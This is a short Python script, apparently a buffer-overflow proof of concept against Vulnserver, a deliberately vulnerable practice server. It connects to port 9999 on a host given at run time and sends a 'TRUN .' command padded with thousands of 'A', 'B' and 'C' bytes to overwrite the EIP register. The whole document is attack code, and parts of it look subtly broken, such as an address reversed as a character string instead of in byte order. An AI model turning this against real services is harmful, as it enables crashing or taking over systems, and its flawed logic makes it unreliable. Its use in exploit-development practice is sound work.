
import socket
import sys


class Vulnserver:

    def conec(ip):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((ip, 9999))
            Vulnserver().bufferoverrun(server)
        except ConnectionRefusedError:
            print("Off")


    def bufferoverrun(self, server):

        string_orig = "0040179E"
        nova_string= string_orig[::-1]
        print("eip alcan√ßado = %s" % string_orig)
        print("eip = %s" % nova_string)

        aa = (2040 - len("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB"))
        bytes_para = 'A' * aa + 'BBBBBBBB' + 'C'*2000
        print("tamanho =  ", (aa - len(nova_string) - 2000))

        overflow = 'TRUN .' + bytes_para
        server.send(overflow.encode())
        resposta = server.recvfrom(20)
        print(resposta)

    func = staticmethod(conec)


if __name__ == '__main__':
    exploit = Vulnserver()
    try:
        exploit.func(sys.argv[1])
    except KeyboardInterrupt:
        pass